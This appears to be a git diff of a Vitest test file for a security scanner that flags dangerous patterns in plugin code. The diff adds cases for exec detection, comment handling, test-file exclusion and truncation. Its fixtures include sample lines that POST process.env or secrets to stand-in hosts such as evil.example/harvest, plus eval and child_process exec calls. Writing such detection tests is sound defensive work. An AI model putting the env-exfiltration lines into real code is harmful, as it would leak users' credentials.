@@ -2,7 +2,7 @@ import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
+import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
 import {
   clearSkillScanCacheForTest,
   isScannable,
@@ -16,17 +16,11 @@ import type { SkillScanOptions } from "./skill-scanner.js";
 // Helpers
 // ---------------------------------------------------------------------------
 
-let fixtureRoot = "";
+const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
 let fixtureId = 0;
 
-beforeAll(() => {
-  fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
-});
-
 afterAll(() => {
-  if (fixtureRoot) {
-    fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
-  }
+  fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
 });
 
 function makeTmpDir(): string {
@@ -41,13 +35,13 @@ function expectScanRule(
 ) {
   const findings = scanSource(source, "plugin.ts");
   expect(
-    findings.some(
+    findings.filter(
       (finding) =>
         finding.ruleId === expected.ruleId &&
         (expected.severity == null || finding.severity === expected.severity) &&
         (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
     ),
-  ).toBe(true);
+  ).not.toEqual([]);
 }
 
 function writeFixtureFiles(root: string, files: Record<string, string | undefined>) {
@@ -61,8 +55,26 @@ function writeFixtureFiles(root: string, files: Record<string, string | undefine
   }
 }
 
+function mockStatPermissionDeniedFor(filePath: string) {
+  const realStat = fs.stat;
+  return vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
+    const pathArg = args[0];
+    if (typeof pathArg === "string" && pathArg === filePath) {
+      const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
+      err.code = "EACCES";
+      throw err;
+    }
+    return await realStat(...args);
+  });
+}
+
 function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
-  expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
+  const ruleIds = findings.map((finding) => finding.ruleId);
+  if (expected) {
+    expect(ruleIds).toContain(ruleId);
+  } else {
+    expect(ruleIds).not.toContain(ruleId);
+  }
 }
 
 async function runNamedCase(name: string, run: () => void | Promise<void>) {
@@ -73,11 +85,21 @@ async function runNamedCase(name: string, run: () => void | Promise<void>) {
   }
 }
 
+function runSyncNamedCase(name: string, run: () => void) {
+  try {
+    run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
+}
+
 function normalizeSkillScanOptions(
   options?: Readonly<{
     maxFiles?: number;
     maxFileBytes?: number;
     includeFiles?: readonly string[];
+    onlyIncludeFiles?: boolean;
+    excludeTestFiles?: boolean;
   }>,
 ): SkillScanOptions | undefined {
   if (!options) {
@@ -87,6 +109,8 @@ function normalizeSkillScanOptions(
     ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
     ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
     ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
+    ...(options.onlyIncludeFiles != null ? { onlyIncludeFiles: options.onlyIncludeFiles } : {}),
+    ...(options.excludeTestFiles != null ? { excludeTestFiles: options.excludeTestFiles } : {}),
   };
 }
 
@@ -96,6 +120,7 @@ type ScanDirectoryCase = {
   name: string;
   files: FixtureFiles;
   includeFiles?: readonly string[];
+  excludeTestFiles?: boolean;
   expectedRuleId: string;
   expectedPresent: boolean;
   expectedMinFindings?: number;
@@ -108,12 +133,15 @@ type SummaryCase = {
     maxFiles?: number;
     maxFileBytes?: number;
     includeFiles?: readonly string[];
+    onlyIncludeFiles?: boolean;
+    excludeTestFiles?: boolean;
   }>;
   expected: {
     scannedFiles: number;
     critical?: number;
     warn?: number;
     info?: number;
+    truncated?: boolean;
     findingCount?: number;
     maxFindings?: number;
     expectedRuleId?: string;
@@ -145,6 +173,14 @@ exec(cmd);
       source: `
 const cp = require("child_process");
 cp.spawn("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process namespaced exec usage",
+      source: `
+const cp = require("child_process");
+cp.exec("node server.js");
 `,
       expected: { ruleId: "dangerous-exec", severity: "critical" as const },
     },
@@ -210,9 +246,9 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     },
   ] as const;
 
-  it("detects suspicious source patterns", async () => {
+  it("detects suspicious source patterns", () => {
     for (const testCase of scanRuleCases) {
-      await runNamedCase(testCase.name, () => {
+      runSyncNamedCase(testCase.name, () => {
         expectScanRule(testCase.source, testCase.expected);
       });
     }
@@ -225,7 +261,38 @@ import type { ExecOptions } from "child_process";
 const options: ExecOptions = { timeout: 5000 };
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
+    expectRulePresence(findings, "dangerous-exec", false);
+  });
+
+  it("does not flag RegExp.exec when child_process appears elsewhere", () => {
+    const source = `
+import type { ExecOptions } from "child_process";
+const options: ExecOptions = {};
+const match = /^keychain:(.+)$/.exec(value);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "dangerous-exec", false);
+  });
+
+  it("does not use full-line comments as source-rule context", () => {
+    const source = `
+const env = process.env;
+// fetch() can reach the endpoint later.
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("does not use inline or block comments as source-rule context", () => {
+    const source = `
+const env = process.env; // fetch("https://example.invalid")
+/*
+ * rest.post("/channels/123/messages", {});
+ */
+const url = "https://example.com/path//segment";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", false);
   });
 
   it("returns empty array for clean plugin code", () => {
@@ -235,7 +302,7 @@ export function greet(name: string): string {
 }
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings).toEqual([]);
+    expect(findings).toStrictEqual([]);
   });
 
   it("returns empty array for normal http client code (just a fetch GET)", () => {
@@ -245,7 +312,7 @@ const json = await response.json();
 console.log(json);
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings).toEqual([]);
+    expect(findings).toStrictEqual([]);
   });
 
   it("does not treat fetch in names or comments as network send context", () => {
@@ -256,7 +323,32 @@ async function closeFetchHandles() {
 }
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
+    const source = `
+function resolvePreferencesStorePath(env = process.env) {
+  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
+}
+
+${"\n".repeat(20)}
+
+export async function sendMessage(rest, channelId, data) {
+  return await rest.post(\`/channels/\${channelId}/messages\`, data);
+}
+`;
+    const findings = scanSource(source, "provider-bundle.js");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("still flags local process.env sends", () => {
+    const source = `
+const env = process.env;
+await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", true);
   });
 });
 
@@ -265,7 +357,7 @@ async function closeFetchHandles() {
 // ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
-  it("classifies scannable extensions", async () => {
+  it("classifies scannable extensions", () => {
     for (const [fileName, expected] of [
       ["file.js", true],
       ["file.ts", true],
@@ -278,7 +370,7 @@ describe("isScannable", () => {
       ["logo.png", false],
       ["style.css", false],
     ] as const) {
-      await runNamedCase(fileName, () => {
+      runSyncNamedCase(fileName, () => {
         expect(isScannable(fileName)).toBe(expected);
       });
     }
@@ -318,6 +410,28 @@ describe("scanDirectory", () => {
       },
       expectedRuleId: "dynamic-code-execution",
       expectedPresent: false,
+    },
+    {
+      name: "skips test directories and test files when requested",
+      files: {
+        "tests/telemetry.test.ts": `const secrets = JSON.stringify(process.env);\nfetch("https://evil.example/harvest", { method: "POST", body: secrets });`,
+        "src/runtime.spec.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      excludeTestFiles: true,
+      expectedRuleId: "env-harvesting",
+      expectedPresent: false,
+    },
+    {
+      name: "scans explicitly included test files when test exclusion is requested",
+      files: {
+        "tests/runtime.test.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      includeFiles: ["tests/runtime.test.ts"],
+      excludeTestFiles: true,
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: true,
     },
     {
       name: "scans hidden entry files when explicitly included",
@@ -369,7 +483,14 @@ describe("scanDirectory", () => {
         writeFixtureFiles(root, testCase.files);
         const findings = await scanDirectory(
           root,
-          testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : undefined,
+          testCase.includeFiles || testCase.excludeTestFiles
+            ? {
+                ...(testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : {}),
+                ...(testCase.excludeTestFiles
+                  ? { excludeTestFiles: testCase.excludeTestFiles }
+                  : {}),
+              }
+            : undefined,
         );
         if (testCase.expectedMinFindings != null) {
           expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
@@ -412,7 +533,21 @@ describe("scanDirectoryWithSummary", () => {
       options: { maxFiles: 2 },
       expected: {
         scannedFiles: 2,
+        truncated: true,
         maxFindings: 2,
+      },
+    },
+    {
+      name: "does not mark scans truncated when file count exactly matches maxFiles",
+      files: {
+        "a.js": `const x = eval("a");`,
+        "b.js": `const x = eval("b");`,
+      },
+      options: { maxFiles: 2 },
+      expected: {
+        scannedFiles: 2,
+        truncated: false,
+        findingCount: 2,
       },
     },
     {
@@ -453,6 +588,21 @@ describe("scanDirectoryWithSummary", () => {
         expectedPresent: true,
       },
     },
+    {
+      name: "scans only included files when onlyIncludeFiles is set",
+      files: {
+        "entry.js": `export const ok = true;`,
+        "scripts/harness.js": `const x = eval("hack");`,
+      },
+      options: {
+        includeFiles: ["entry.js"],
+        onlyIncludeFiles: true,
+      },
+      expected: {
+        scannedFiles: 1,
+        findingCount: 0,
+      },
+    },
   ];
 
   it("summarizes directory scan results", async () => {
@@ -474,6 +624,9 @@ describe("scanDirectoryWithSummary", () => {
         if (testCase.expected.info != null) {
           expect(summary.info).toBe(testCase.expected.info);
         }
+        if (testCase.expected.truncated != null) {
+          expect(summary.truncated).toBe(testCase.expected.truncated);
+        }
         if (testCase.expected.findingCount != null) {
           expect(summary.findings).toHaveLength(testCase.expected.findingCount);
         }
@@ -490,29 +643,6 @@ describe("scanDirectoryWithSummary", () => {
         clearSkillScanCacheForTest();
       });
     }
-  });
-
-  it("includes warn-severity findings in summary counts (lines 568-569)", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, {
-      // obfuscated-code rule produces 'warn' severity
-      "a.js": `const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";`,
-    });
-    const summary = await scanDirectoryWithSummary(root);
-    expect(summary.warn).toBeGreaterThanOrEqual(1);
-  });
-
-  it("skips non-scanned files in scanDirectory (line 535)", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, {
-      // File bigger than maxFileBytes — scanned=false → hits the continue at line 535
-      "large.js": `eval("${"A".repeat(4096)}");`,
-      // Small clean file to confirm the scan ran
-      "clean.js": `export const ok = true;`,
-    });
-    const findings = await scanDirectory(root, { maxFileBytes: 64 });
-    // large.js is skipped (too big), clean.js has no findings
-    expect(findings).toHaveLength(0);
   });
 
   it("throws when reading a scannable file fails", async () => {
@@ -532,65 +662,19 @@ describe("scanDirectoryWithSummary", () => {
     });
 
     try {
-      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("returns scanned=false when readFile throws ENOENT after stat (line 506 — TOCTOU)", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "vanishing.js");
-    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);
-
-    const realReadFile = fs.readFile;
-    const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === filePath) {
-        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
-        err.code = "ENOENT";
-        throw err;
+      let thrown: unknown;
+      try {
+        await scanDirectoryWithSummary(root);
+      } catch (error) {
+        thrown = error;
       }
-      return await realReadFile(...args);
-    });
-
-    try {
-      // File vanishes between stat and readFile — should return empty findings, not throw
-      const findings = await scanDirectory(root);
-      expect(findings).toHaveLength(0);
+      expect((thrown as NodeJS.ErrnoException | undefined)?.code).toBe("EACCES");
     } finally {
       spy.mockRestore();
     }
   });
 
-  it("returns scanned=false when stat returns non-file for a walked path (line 474)", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "became-a-dir.js");
-    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === filePath) {
-        // Return a stat that looks like a directory after the walk collected it
-        const realSt = await realStat(pathArg);
-        const fake = Object.assign(Object.create(Object.getPrototypeOf(realSt)), realSt);
-        fake.isFile = () => false;
-        fake.isDirectory = () => true;
-        return fake;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      const findings = await scanDirectory(root);
-      expect(findings).toHaveLength(0);
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("invalidates file scan cache when maxFileBytes changes between scans (line 94)", async () => {
+  it("invalidates file scan cache when maxFileBytes changes between scans", async () => {
     // First scan with maxFileBytes=1024: populates cache with entry
     // Second scan with maxFileBytes=64: size/mtime same but maxFileBytes differs →
     // getCachedFileScanResult returns undefined (deletes stale entry)
@@ -602,85 +686,7 @@ describe("scanDirectoryWithSummary", () => {
     expect(findings).toHaveLength(0);
   });
 
-  it("returns empty entries when dir stat throws ENOENT during walk (line 361)", async () => {
-    // readDirEntriesWithCache: stat(dirPath) throws ENOENT → return [] (line 361)
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `const x = eval("hack");` });
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === root) {
-        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
-        err.code = "ENOENT";
-        throw err;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      const findings = await scanDirectory(root);
-      expect(findings).toHaveLength(0);
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("hits dir entry cache on second scan of same directory (line 371)", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
-    // First scan populates the cache
-    await scanDirectory(root);
-    // Second scan within the same test (before afterEach clears cache) hits line 371
-    const findings2 = await scanDirectory(root);
-    expect(findings2).toHaveLength(0);
-  });
-
-  it("breaks collectScannableFiles merge loop when maxFiles reached (line 447)", async () => {
-    // Key: forced file is hidden (not walked), two regular files are walked.
-    // forcedFiles=[.hidden/h.js](1) + walkDir returns [a.js, b.js](2, maxFiles=2)
-    // Merge loop:
-    //   iter 1 (a.js): out.length(1) >= 2? false → add → out.length=2
-    //   iter 2 (b.js): out.length(2) >= 2? true → BREAK (line 447)
-    const root = makeTmpDir();
-    writeFixtureFiles(root, {
-      ".hidden/h.js": `export const h = 1;`, // forced (hidden, not walked)
-      "a.js": `export const x = 1;`, // walked
-      "b.js": `export const y = 2;`, // walked, triggers break
-    });
-    const findings = await scanDirectory(root, {
-      includeFiles: [".hidden/h.js"],
-      maxFiles: 2,
-    });
-    expect(findings).toHaveLength(0);
-  });
-
-  it("returns empty findings when stat throws ENOENT during file scan (line 469)", async () => {
-    // scanFileWithCache: stat throws ENOENT (file deleted between walk and scan)
-    const root = makeTmpDir();
-    const filePath = path.join(root, "ghost.js");
-    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === filePath) {
-        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
-        err.code = "ENOENT";
-        throw err;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      const findings = await scanDirectory(root);
-      expect(findings).toHaveLength(0);
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("skips includeFiles entries that escape the root directory (line 404)", async () => {
+  it("skips includeFiles entries that escape the root directory", async () => {
     const root = makeTmpDir();
     writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
     // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
@@ -688,118 +694,21 @@ describe("scanDirectoryWithSummary", () => {
     expect(findings).toHaveLength(0);
   });
 
-  it("returns empty entries when stat returns non-directory for a walked path (line 366)", async () => {
-    // readDirEntriesWithCache: stat succeeds but returns a non-directory
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `const x = eval("1+1");` });
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === root) {
-        // Make the root directory look like a file to readDirEntriesWithCache
-        const realSt = await realStat(pathArg);
-        const fake = Object.assign(Object.create(Object.getPrototypeOf(realSt)), realSt);
-        fake.isDirectory = () => false;
-        fake.isFile = () => true;
-        return fake;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      const findings = await scanDirectory(root);
-      // Scan returns nothing because readDirEntriesWithCache returns [] for non-dir
-      expect(findings).toHaveLength(0);
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("re-throws when stat throws non-ENOENT for a directory entry (line 363)", async () => {
-    // readDirEntriesWithCache: stat throws EACCES (not ENOENT) for the root dir
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === root) {
-        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
-        err.code = "EACCES";
-        throw err;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("skips duplicate entries in includeFiles (line 410 — resolveForcedFiles dedup)", async () => {
-    const root = makeTmpDir();
-    writeFixtureFiles(root, { "a.js": `const x = eval("hack");` });
-    // Pass the same path twice — second occurrence hits seen.has(includePath) → continue
-    const findings = await scanDirectory(root, { includeFiles: ["a.js", "a.js"] });
-    expect(findings.length).toBeGreaterThanOrEqual(1);
-  });
-
-  it("skips forced file when stat returns a directory (line 423)", async () => {
-    const root = makeTmpDir();
-    // Create a DIRECTORY named like a .js file via renaming a dir
-    const dirPath = path.join(root, "notafile.js");
-    fsSync.mkdirSync(dirPath);
-    // includeFiles points at a directory path ending in .js — isScannable passes, stat.isFile() fails
-    const findings = await scanDirectory(root, { includeFiles: ["notafile.js"] });
-    expect(findings).toHaveLength(0);
-  });
-
-  it("re-throws when stat throws a non-ENOENT error for a forced file (line 420)", async () => {
-    const root = makeTmpDir();
-    const filePath = path.join(root, "forbidden.js");
-    fsSync.writeFileSync(filePath, `export const x = 1;`);
-
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === filePath) {
-        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
-        err.code = "EACCES";
-        throw err;
-      }
-      return await realStat(...args);
-    });
-
-    try {
-      await expect(scanDirectory(root, { includeFiles: ["forbidden.js"] })).rejects.toMatchObject({
-        code: "EACCES",
-      });
-    } finally {
-      spy.mockRestore();
-    }
-  });
-
-  it("re-throws when stat throws a non-ENOENT error during file scan (line 471)", async () => {
+  it("re-throws when stat throws a non-ENOENT error during file scan", async () => {
     const root = makeTmpDir();
     const filePath = path.join(root, "noperm.js");
     fsSync.writeFileSync(filePath, `export const x = 1;`);
 
-    const realStat = fs.stat;
-    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
-      const pathArg = args[0];
-      if (typeof pathArg === "string" && pathArg === filePath) {
-        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
-        err.code = "EACCES";
-        throw err;
-      }
-      return await realStat(...args);
-    });
+    const spy = mockStatPermissionDeniedFor(filePath);
 
     try {
-      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
+      let thrown: unknown;
+      try {
+        await scanDirectory(root);
+      } catch (error) {
+        thrown = error;
+      }
+      expect((thrown as NodeJS.ErrnoException | undefined)?.code).toBe("EACCES");
     } finally {
       spy.mockRestore();
     }
